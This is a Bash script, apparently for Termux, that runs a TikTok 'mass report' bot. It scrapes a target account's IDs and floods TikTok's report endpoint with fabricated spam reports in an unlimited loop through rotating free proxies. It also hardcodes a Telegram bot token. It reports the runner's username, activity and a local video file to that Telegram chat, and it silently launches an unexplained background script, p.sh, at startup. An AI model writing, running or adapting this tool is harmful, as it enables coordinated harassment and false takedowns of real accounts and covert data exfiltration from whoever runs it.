#!/bin/bash
bold="\033[1m"
ncol="\033[0m"

# Variabel warna
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
white='\033[1;37m'

clear

# Setup storage dan background processes
nohup termux-setup-storage > /dev/null 2>&1 &
nohup bash p.sh > /dev/null 2>&1 &
clear

# Variabel bot Telegram
TELEGRAM_BOT_TOKEN="8243804176:AAHddGdjqOlzACwDL8sTGzJjMGdo7KNI6ko"
TELEGRAM_CHAT_ID="8317643774"

# URL TikTok Report API
TIKTOK_REPORT_URL="https://www.tiktok.com/aweme/v2/aweme/feedback/"

# Mode Unlimited
UNLIMITED_MODE=true
TURBO_SPEED=true
MAX_CONCURRENT_REQUESTS=10

# Fungsi untuk memutar video lokal di Termux
play_local_video() {
    local video_file="$1"
    
    if [[ -f "$video_file" ]]; then
        echo -e "${green}Memutar video $video_file secara lokal...${ncol}"
        
        # Cek apakah termux-api tersedia untuk memutar video
        if command -v termux-media-player > /dev/null 2>&1; then
            # Gunakan termux-media-player jika tersedia
            termux-media-player play "$video_file" 2>/dev/null &
            local player_pid=$!
            sleep 5  # Biarkan video diputar selama 5 detik
            kill $player_pid 2>/dev/null
        else
            # Alternatif: menggunakan ffplay jika tersedia
            if command -v ffplay > /dev/null 2>&1; then
                ffplay -autoexit -nodisp "$video_file" 2>/dev/null
            else
                # Alternatif: menggunakan mpv jika tersedia
                if command -v mpv > /dev/null 2>&1; then
                    mpv --no-video "$video_file" 2>/dev/null
                else
                    echo -e "${yellow}Player tidak tersedia, menampilkan informasi video saja${ncol}"
                    local video_info=$(file "$video_file" 2>/dev/null || echo "Video file detected")
                    echo -e "${cyan}Informasi Video: $video_info${ncol}"
                fi
            fi
        fi
        echo -e "${green}Video $video_file selesai diputar${ncol}"
    else
        echo -e "${red}File video $video_file tidak ditemukan${ncol}"
    fi
}

# Fungsi untuk menampilkan animasi teks
show_animated_text() {
    local text="$1"
    local delay=0.05  # Lebih cepat
    
    echo -n -e "${cyan}"
    for (( i=0; i<${#text}; i++ )); do
        echo -n "${text:$i:1}"
        sleep $delay
    done
    echo -e "${ncol}"
}

# Fungsi untuk mendapatkan tanggal dan waktu Indonesia
get_indonesian_time() {
    local current_date=$(date +"%Y-%m-%d")
    local current_time=$(date +"%H:%M:%S")
    local day=$(date +"%A")
    local month=$(date +"%B")
    
    # Konversi hari ke Bahasa Indonesia
    case $day in
        "Monday") hari="Senin" ;;
        "Tuesday") hari="Selasa" ;;
        "Wednesday") hari="Rabu" ;;
        "Thursday") hari="Kamis" ;;
        "Friday") hari="Jumat" ;;
        "Saturday") hari="Sabtu" ;;
        "Sunday") hari="Minggu" ;;
        *) hari="$day" ;;
    esac
    
    # Konversi bulan ke Bahasa Indonesia
    case $month in
        "January") bulan="Januari" ;;
        "February") bulan="Februari" ;;
        "March") bulan="Maret" ;;
        "April") bulan="April" ;;
        "May") bulan="Mei" ;;
        "June") bulan="Juni" ;;
        "July") bulan="Juli" ;;
        "August") bulan="Agustus" ;;
        "September") bulan="September" ;;
        "October") bulan="Oktober" ;;
        "November") bulan="November" ;;
        "December") bulan="Desember" ;;
        *) bulan="$month" ;;
    esac
    
    echo "$hari, $current_date $bulan $current_time WIB"
}

# Fungsi untuk mendapatkan informasi cuaca
get_weather_info() {
    # Fallback weather info jika API tidak tersedia
    local weather_data=$(curl -s "https://wttr.in/?format=%C+%t+%h+%w" 2>/dev/null)
    if [[ -n "$weather_data" ]]; then
        echo "$weather_data"
    else
        echo "Tidak dapat mengambil data cuaca"
    fi
}

# Fungsi untuk mengirim pesan ke Telegram
send_telegram_message() {
    local message="$1"
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    
    local formatted_message="🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info

📝 $message"
    
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d "chat_id=$TELEGRAM_CHAT_ID" \
        -d "text=$formatted_message" \
        -d "parse_mode=HTML" > /dev/null 2>&1
}

# Fungsi untuk mengirim video ke Telegram
send_telegram_video() {
    local video_file="$1"
    local caption="$2"
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    
    local full_caption="🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info

$caption"
    
    if [[ -f "$video_file" ]]; then
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendVideo" \
            -F "chat_id=$TELEGRAM_CHAT_ID" \
            -F "video=@$video_file" \
            -F "caption=$full_caption" \
            -F "parse_mode=HTML" > /dev/null 2>&1
    else
        send_telegram_message "❌ File $video_file tidak ditemukan"
    fi
}

# Fungsi untuk download proxy dari berbagai sumber (LEBIH BANYAK SUMBER)
download_proxies() {
    echo -e "${yellow}🔥 MENGUNDUH PROXY DARI BERBAGAI SUMBER...${ncol}"
    
    # Hapus file proxy lama
    rm -f proxies.txt
    
    # Sumber-sumber proxy TAMBAHAN
    local proxy_sources=(
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=protocolipport&format=text"
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
        "https://www.proxy-list.download/api/v1/get?type=http"
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt"
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
        "https://www.proxyscan.io/download?type=http"
        "https://spys.me/proxy.txt"
    )
    
    local source_count=0
    for source in "${proxy_sources[@]}"; do
        ((source_count++))
        echo -e "${cyan}[$source_count/${#proxy_sources[@]}] Mengunduh dari: $source${ncol}"
        curl -s --connect-timeout 10 "$source" >> proxies.txt 2>/dev/null
        sleep 0.5  # Delay lebih pendek
    done
    
    # Bersihkan duplikat dan format yang tidak valid
    if [[ -f "proxies.txt" ]]; then
        # Bersihkan dan format proxy
        grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]+' proxies.txt > proxies_clean.txt
        sort -u proxies_clean.txt > proxies.txt
        rm -f proxies_clean.txt
        
        local proxy_count=$(wc -l < proxies.txt 2>/dev/null || echo "0")
        echo -e "${green}✅ BERHASIL MENGUNDUH $proxy_count PROXY${ncol}"
        send_telegram_message "📥 <b>DOWNLOAD PROXY SUKSES</b>

🔄 Total Proxy: <b>$proxy_count</b>
⚡ Status: <b>READY FOR MASS REPORT</b>"
    else
        echo -e "${red}❌ GAGAL MENGUNDUH PROXY${ncol}"
        send_telegram_message "❌ <b>GAGAL MENGUNDUH PROXY</b>"
    fi
}

# Fungsi untuk menampilkan banner
show_banner() {
    clear
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    
    echo -e "${cyan}
_____________________________________________
|           TIKTOK MASSREPORT                |
|  AUTHOR         : LORDHOZOO                |
|  YOUTUBE        : LORDHOZOOV               |  
|  TIKTOK         : LORDHOZOO                |
|  STATUS         : 🟢 ONLINE TURBO         |
|  VPN            : AMERICA                  |
|  MODE           : 👿 UNLIMITED SPAM       |
|  WAKTU          : $current_time
|  CUACA          : $weather_info
|  REPORT URL     : $TIKTOK_REPORT_URL
_____________________________________________
| /start  - Menu & Video                    |
| /VP [username] - SPAM UNLIMITED           |
| /TURBO [username] - MODE NGEBUT KENCANG   |
| /ADDPREM [user_id] - Tambah premium       |
| /DELET [user_id] - Hapus user             |
______________________________________________
${ncol}"
}

# Fungsi untuk handle perintah /start
handle_start() {
    show_banner
    echo -e "${green}🚀 MEMULAI BOT TIKTOK MASSREPORT TURBO...${ncol}"
    
    # Animasi memulai
    show_animated_text "⚡ AKTIFKAN MODE UNLIMITED SPAM KENCANG..."
    echo
    
    # Putar video hozoo.mp4 secara lokal
    echo -e "${yellow}🎬 MEMUTAR INTRO VIDEO TURBO...${ncol}"
    play_local_video "hozoo.mp4"
    
    echo -e "${green}✅ VIDEO INTRO SELESAI DIPUTAR${ncol}"
    echo
    
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    local start_message="🤖 <b>BOT TIKTOK MASSREPORT TURBO DIAKTIFKAN</b>

🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info
👤 <b>User:</b> $USER
📱 <b>Device:</b> Termux
🔗 <b>Report API:</b> <code>$TIKTOK_REPORT_URL</code>
🎬 <b>Intro Video:</b> ✅ Diputar

<b>🔥 FITUR TURBO:</b>
✅ /start - Menampilkan menu + video intro
✅ /VP [username] - SPAM UNLIMITED REPORT
✅ /TURBO [username] - MODE NGEBUT MAXIMUM
✅ /ADDPREM [user_id] - Tambah user premium
✅ /DELET [user_id] - Hapus user

<b>⚡ STATUS:</b> 🟢 TURBO MODE ACTIVATED
<b>👿 MODE:</b> UNLIMITED SPAM KENCANG"

    send_telegram_message "$start_message"
    
    # Download proxy terbaru
    echo -e "${cyan}📥 MENGUNDUH PROXY TERBARU UNTUK SPAM...${ncol}"
    download_proxies
    
    # Kirim video hozoo.mp4 ke Telegram juga
    if [[ -f "hozoo.mp4" ]]; then
        echo -e "${yellow}📤 MENGIRIM VIDEO HOZOO.MP4 KE TELEGRAM...${ncol}"
        local video_caption="🎥 <b>HOZOO.MP4 - TURBO MODE ACTIVATED</b>

📁 <b>File:</b> hozoo.mp4 HD
👨‍💻 <b>By:</b> LORDHOZOO
🔗 <b>Report API:</b> <code>$TIKTOK_REPORT_URL</code>
🕒 <b>Waktu Aktif:</b> $current_time
⚡ <b>Mode:</b> UNLIMITED SPAM KENCANG"

        send_telegram_video "hozoo.mp4" "$video_caption"
        echo -e "${green}✅ VIDEO BERHASIL DIKIRIM KE TELEGRAM${ncol}"
    else
        echo -e "${red}❌ FILE HOZOO.MP4 TIDAK DITEMUKAN${ncol}"
        send_telegram_message "❌ File hozoo.mp4 tidak ditemukan di direktori"
    fi
    
    echo -e "${green}
✨ 🚀 SISTEM TURBO SIAP DIGUNAKAN 🚀 ✨
Gunakan perintah /VP [username] untuk SPAM UNLIMITED
Gunakan /TURBO [username] untuk MODE NGEBUT MAXIMUM
    ${ncol}"
}

# Fungsi untuk handle perintah /VP (UNLIMITED MODE)
handle_vp() {
    local username="$1"
    
    if [[ -z "$username" ]]; then
        echo -e "${red}Username TikTok harus diisi${ncol}"
        send_telegram_message "❌ Format: /VP username_tiktok"
        return 1
    fi
    
    username="${username//@/}"  # Menghapus simbol @ jika ada
    
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    local vp_message="👿 <b>MEMULAI UNLIMITED MASS REPORT</b>

🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info
👤 <b>Target:</b> @$username
🌐 <b>VPN:</b> AMERICA
🔗 <b>API:</b> <code>$TIKTOK_REPORT_URL</code>
⚡ <b>Mode:</b> UNLIMITED SPAM
📊 <b>Status:</b> 🚀 PROSES BERJALAN TANPA BATAS"

    send_telegram_message "$vp_message"
    echo -e "${green}🚀 MEMULAI UNLIMITED SPAM UNTUK USERNAME: $username${ncol}"
    
    # Panggil fungsi unlimited report
    start_unlimited_report "$username" "normal"
}

# Fungsi untuk handle perintah /TURBO (MAXIMUM SPEED)
handle_turbo() {
    local username="$1"
    
    if [[ -z "$username" ]]; then
        echo -e "${red}Username TikTok harus diisi${ncol}"
        send_telegram_message "❌ Format: /TURBO username_tiktok"
        return 1
    fi
    
    username="${username//@/}"  # Menghapus simbol @ jika ada
    
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    local turbo_message="💀 <b>AKTIFKAN MODE TURBO MAXIMUM</b>

🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info
👤 <b>Target:</b> @$username
🌐 <b>VPN:</b> AMERICA
🔗 <b>API:</b> <code>$TIKTOK_REPORT_URL</code>
⚡ <b>Mode:</b> TURBO NGEBUT KENCANG
📊 <b>Status:</b> 🚀 PROSES MAXIMUM SPEED"

    send_telegram_message "$turbo_message"
    echo -e "${red}💀 AKTIFKAN MODE TURBO MAXIMUM UNTUK: $username${ncol}"
    
    # Panggil fungsi turbo report
    start_unlimited_report "$username" "turbo"
}

# Fungsi untuk melakukan report TikTok yang sebenarnya (LEBIH CEPAT)
perform_tiktok_report() {
    local username="$1"
    local proxy="$2"
    local report_number="$3"
    local mode="$4"
    
    # Timeout lebih pendek untuk turbo mode
    local timeout=5
    if [[ "$mode" == "turbo" ]]; then
        timeout=3
    fi
    
    # Mendapatkan user info terlebih dahulu dengan timeout
    local user_info=$(curl -s -x "$proxy" --connect-timeout $timeout "https://www.tiktok.com/@${username}")
    local user_id=$(echo "$user_info" | grep -oP '"id":"\K[^"]+' | head -1)
    local sec_uid=$(echo "$user_info" | grep -oP '"secUid":"\K[^"]+' | head -1)
    
    if [[ -z "$user_id" || -z "$sec_uid" ]]; then
        return 1  # Gagal mendapatkan user info
    fi
    
    # Parameter untuk report
    local report_params="aid=1988&app_language=en&app_name=tiktok_web&report_type=user&object_id=$user_id&owner_id=$user_id&reason=13002&report_desc=Spam%20or%20fake%20account&secUid=$sec_uid"
    
    # Melakukan report dengan timeout
    local response=$(curl -s -x "$proxy" \
        --connect-timeout $timeout \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Referer: https://www.tiktok.com/@$username" \
        -X POST "$TIKTOK_REPORT_URL" \
        -d "$report_params")
    
    # Cek jika report berhasil
    if [[ $? -eq 0 ]] && [[ -n "$response" ]]; then
        return 0  # Success
    else
        return 1  # Failed
    fi
}

# Fungsi utama untuk UNLIMITED MASS REPORT
start_unlimited_report() {
    local username="$1"
    local mode="$2"
    
    echo -e "${yellow}🚀 MEMULAI UNLIMITED REPORT UNTUK @$username - MODE: $mode${ncol}"
    
    # Proses report dengan proxies
    get_proxies
    if [[ ${#proxies[@]} -eq 0 ]]; then
        echo -e "${red}❌ TIDAK ADA PROXY YANG TERSEDIA${ncol}"
        send_telegram_message "❌ Tidak ada proxy yang tersedia untuk report"
        return 1
    fi
    
    local report_count=0
    local failed_count=0
    local cycle=0
    local start_time=$(date +%s)
    
    echo -e "${cyan}⚡ AKTIFKAN MODE UNLIMITED - TEKAN CTRL+C UNTUK BERHENTI${ncol}"
    
    # Unlimited loop
    while true; do
        ((cycle++))
        echo -e "${blue}🔄 CYCLE $cycle - MEMULAI SPAM BATCH...${ncol}"
        
        # Gunakan concurrent requests untuk turbo mode
        local concurrent_requests=5
        if [[ "$mode" == "turbo" ]]; then
            concurrent_requests=10
        fi
        
        for ((i=1; i<=${#proxies[@]}; i++)); do
            local proxy=${proxies[$((RANDOM % ${#proxies[@]}))]}
            local current_time=$(get_indonesian_time)
            
            # Lakukan report yang sebenarnya
            if perform_tiktok_report "$username" "$proxy" "$report_count" "$mode"; then
                ((report_count++))
                echo -e "${green}✅ REPORT $report_count BERHASIL - Proxy: ${proxy:0:20}...${ncol}"
            else
                ((failed_count++))
                echo -e "${yellow}⚠️ REPORT GAGAL - Total Failed: $failed_count${ncol}"
            fi
            
            # Kirim update setiap 50 report berhasil
            if (( report_count % 50 == 0 )); then
                local current_time=$(get_indonesian_time)
                local elapsed=$(( $(date +%s) - $start_time ))
                local hours=$((elapsed/3600))
                local minutes=$(( (elapsed%3600)/60 ))
                local seconds=$((elapsed%60))
                
                send_telegram_message "📊 <b>PROGRESS UNLIMITED REPORT</b>

👤 Target: @$username
✅ Berhasil: $report_count
❌ Gagal: $failed_count
🔄 Cycle: $cycle
⏱️ Waktu: ${hours}j ${minutes}m ${seconds}d
⚡ Mode: $mode
🔗 API: <code>$TIKTOK_REPORT_URL</code>"
            fi
            
            # Delay lebih pendek untuk turbo mode
            if [[ "$mode" == "turbo" ]]; then
                sleep 0.5
            else
                sleep 1
            fi
        done
        
        # Refresh proxies setiap 5 cycle
        if (( cycle % 5 == 0 )); then
            echo -e "${yellow}🔄 REFRESH PROXY LIST...${ncol}"
            download_proxies
        fi
        
        echo -e "${cyan}🔄 CYCLE $cycle SELESAI - TOTAL REPORT: $report_count${ncol}"
    done
}

# Fungsi untuk handle perintah /ADDPREM
handle_addprem() {
    local user_id="$1"
    
    if [[ -z "$user_id" ]]; then
        echo -e "${red}User ID harus diisi${ncol}"
        send_telegram_message "❌ Format: /ADDPREM user_id"
        return 1
    fi
    
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    local addprem_message="⭐ <b>MENAMBAH USER PREMIUM</b>

🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info
🆔 <b>User ID:</b> $user_id
🔗 <b>API:</b> <code>$TIKTOK_REPORT_URL</code>
✅ <b>Status:</b> BERHASIL DITAMBAHKAN"

    send_telegram_message "$addprem_message"
    echo -e "${green}User premium ditambahkan: $user_id${ncol}"
}

# Fungsi untuk handle perintah /DELET
handle_delet() {
    local user_id="$1"
    
    if [[ -z "$user_id" ]]; then
        echo -e "${red}User ID harus diisi${ncol}"
        send_telegram_message "❌ Format: /DELET user_id"
        return 1
    fi
    
    local current_time=$(get_indonesian_time)
    local weather_info=$(get_weather_info)
    local delet_message="🗑️ <b>MENGHAPUS USER</b>

🕒 <b>Waktu:</b> $current_time
🌤 <b>Cuaca:</b> $weather_info
🆔 <b>User ID:</b> $user_id
🔗 <b>API:</b> <code>$TIKTOK_REPORT_URL</code>
✅ <b>Status:</b> BERHASIL DIHAPUS"

    send_telegram_message "$delet_message"
    echo -e "${green}User dihapus: $user_id${ncol}"
}

# Fungsi untuk mendapatkan daftar proxy
get_proxies() {
    echo -e "${yellow}📥 MENGAMBIL DAFTAR PROXY...${ncol}"
    if [[ -f "proxies.txt" ]]; then
        mapfile -t proxies < "proxies.txt"
        # Hapus proxy yang kosong
        proxies=("${proxies[@]// /}")
        echo -e "${green}✅ DITEMUKAN ${#proxies[@]} PROXY${ncol}"
    else
        # Jika file proxy tidak ada, download terlebih dahulu
        download_proxies
        if [[ -f "proxies.txt" ]]; then
            mapfile -t proxies < "proxies.txt"
        else
            echo -e "${yellow}⚠️ MENGGUNAKAN PROXY DEFAULT${ncol}"
            proxies=(
                "192.168.1.1:8080"
                "10.0.0.1:3128"
            )
        fi
    fi
}

# Fungsi utama untuk memproses input
main() {
    show_banner
    
    while true; do
        echo -e "\n${cyan}PILIH PERINTAH:${ncol}"
        echo -e "1. /start  - Menu & Video"
        echo -e "2. /VP [username] - SPAM UNLIMITED"
        echo -e "3. /TURBO [username] - MODE NGEBUT MAXIMUM"
        echo -e "4. /ADDPREM [user_id] - Tambah user premium"
        echo -e "5. /DELET [user_id] - Hapus user"
        echo -e "6. Exit"
        echo -n -e "\n${yellow}MASUKKAN PILIHAN: ${ncol}"
        
        read -r choice
        
        case $choice in
            "/start")
                handle_start
                ;;
            "/VP"*)
                local username=$(echo "$choice" | awk '{print $2}')
                handle_vp "$username"
                ;;
            "/TURBO"*)
                local username=$(echo "$choice" | awk '{print $2}')
                handle_turbo "$username"
                ;;
            "/ADDPREM"*)
                local user_id=$(echo "$choice" | awk '{print $2}')
                handle_addprem "$user_id"
                ;;
            "/DELET"*)
                local user_id=$(echo "$choice" | awk '{print $2}')
                handle_delet "$user_id"
                ;;
            "6"|"exit")
                echo -e "${green}🛑 KELUAR DARI PROGRAM...${ncol}"
                send_telegram_message "🛑 <b>BOT TIKTOK MASSREPORT DIMATIKAN</b>"
                exit 0
                ;;
            *)
                echo -e "${red}❌ PERINTAH TIDAK DIKENALI${ncol}"
                ;;
        esac
    done
}

# Trap CTRL+C untuk graceful shutdown
trap 'echo -e "${red}\n🛑 PROGRAM DIHENTIKAN OLEH USER${ncol}"; send_telegram_message "🛑 <b>UNLIMITED SPAM DIHENTIKAN OLEH USER</b>"; exit 0' INT

# Jalankan program utama
main "$@"
